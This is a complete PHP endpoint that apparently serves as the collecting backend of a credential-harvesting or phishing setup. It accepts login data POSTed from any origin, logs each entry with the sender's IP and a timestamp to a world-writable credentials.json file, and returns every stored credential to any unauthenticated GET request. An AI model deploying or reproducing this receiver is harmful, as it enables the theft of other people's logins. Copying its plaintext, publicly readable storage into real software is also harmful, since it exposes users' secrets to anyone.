
<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit();
}

$dataFile = __DIR__ . '/credentials.json';

// Create the data file if it doesn't exist
if (!file_exists($dataFile)) {
    file_put_contents($dataFile, json_encode([]));
    chmod($dataFile, 0666); // Make sure it's writable
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the raw POST data
    $rawData = file_get_contents('php://input');
    $credential = json_decode($rawData, true);
    
    if ($credential) {
        // Read existing data
        $existingData = json_decode(file_get_contents($dataFile), true);
        
        // Add timestamp and IP if not provided
        if (!isset($credential['timestamp'])) {
            $credential['timestamp'] = date('Y-m-d H:i:s');
        }
        if (!isset($credential['ip'])) {
            $credential['ip'] = $_SERVER['REMOTE_ADDR'];
        }
        
        // Add a unique ID if not provided
        if (!isset($credential['id'])) {
            $credential['id'] = uniqid();
        }
        
        // Add the new credential
        $existingData[] = $credential;
        
        // Save back to file
        file_put_contents($dataFile, json_encode($existingData, JSON_PRETTY_PRINT));
        
        echo json_encode(['success' => true, 'credential' => $credential]);
    } else {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => 'Invalid data format']);
    }
} else if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Return all credentials
    $credentials = json_decode(file_get_contents($dataFile), true);
    echo json_encode($credentials);
}
?>
